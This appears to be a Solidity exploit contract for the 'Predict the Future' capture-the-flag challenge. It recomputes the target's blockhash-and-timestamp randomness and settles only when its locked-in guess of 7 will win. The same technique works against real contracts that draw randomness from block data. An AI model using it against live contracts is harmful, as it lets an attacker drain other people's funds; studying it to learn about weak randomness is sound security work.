//SPDX-License-Identifier: No License
pragma solidity ^0.8.0;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
}

contract PredictTheFutureChallenge {
    IPredictTheFutureChallenge public challenge = IPredictTheFutureChallenge(0x48ecbECeA9afe1b7e0F3CD848b2C616eeF462710);
    address public owner;
    event AnswerGenerated(uint8 n);

    constructor() {
        owner = msg.sender;
    }

    function lockInGuess() public payable {
      require(msg.sender == owner, "Only the owner can solve this challenge");
      require(msg.value == 1 ether, "You must send 1 ether");

      challenge.lockInGuess{value: 1 ether}(7);
      payable(msg.sender).transfer(address(this).balance);
    }

    function settle() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");

        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        emit AnswerGenerated(answer);

        if (answer == 7) {
          challenge.settle(); 
          payable(msg.sender).transfer(address(this).balance);
        }
    }

    receive() external payable {}
}
